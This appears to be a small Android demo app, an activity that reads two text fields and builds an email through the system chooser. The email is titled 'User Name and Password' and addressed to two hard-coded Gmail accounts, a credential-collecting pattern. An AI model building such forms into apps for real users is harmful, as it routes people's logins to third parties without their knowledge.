package com.example.sendmail;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

public class MainActivity extends AppCompatActivity
{
    EditText editText;
    EditText editText1;
    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button button = (Button)findViewById(R.id.btn1);
        editText = (EditText)findViewById(R.id.et1);
        editText1 = (EditText)findViewById(R.id.et2);
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String[] strings = {"anurajjj217@gmail.com"};
                String[] strings1 = {"anurajjj416@gmail.com"};
                String s=editText.getText().toString()+" "+editText1.getText().toString();
                sendEmail(strings,strings1,"User Name and Password  " , s );
            }
        });
    }
    public void sendEmail(String[] email , String[] carbon , String subject ,String message)
    {
        Intent intent = new Intent(Intent.ACTION_SEND);
        intent.setData(Uri.parse("Mail to "));
        String[] to = email;
        String[] cc = carbon;
        intent.putExtra(Intent.EXTRA_EMAIL , to);
        intent.putExtra(Intent.EXTRA_CC,cc);
        intent.putExtra(Intent.EXTRA_SUBJECT,subject);
        intent.putExtra(Intent.EXTRA_TEXT,message);
        intent.setType("message/rfc822");
        startActivity(intent.createChooser(intent,"Email"));
    }

}
